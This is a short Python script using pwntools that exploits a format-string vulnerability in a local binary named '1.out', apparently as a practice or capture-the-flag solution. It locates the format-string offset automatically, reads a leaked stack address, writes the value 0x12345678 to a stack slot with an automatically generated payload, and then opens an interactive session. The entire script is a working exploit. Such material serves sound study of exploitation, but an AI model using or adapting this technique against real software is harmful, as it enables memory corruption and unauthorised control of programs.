from pwn import *
context.binary = './1.out'

@context.quiet
def printf(l:str):
    r = context.binary.process()
    r.sendlineafter('\n',l)
    return r.recvline()

offset = FmtStr(printf).offset
r = context.binary.process()
stack = int(r.recvline(),16)
r.sendline(fmtstr_payload(offset, {stack+56:0x12345678}, write_size='short'))
r.interactive()
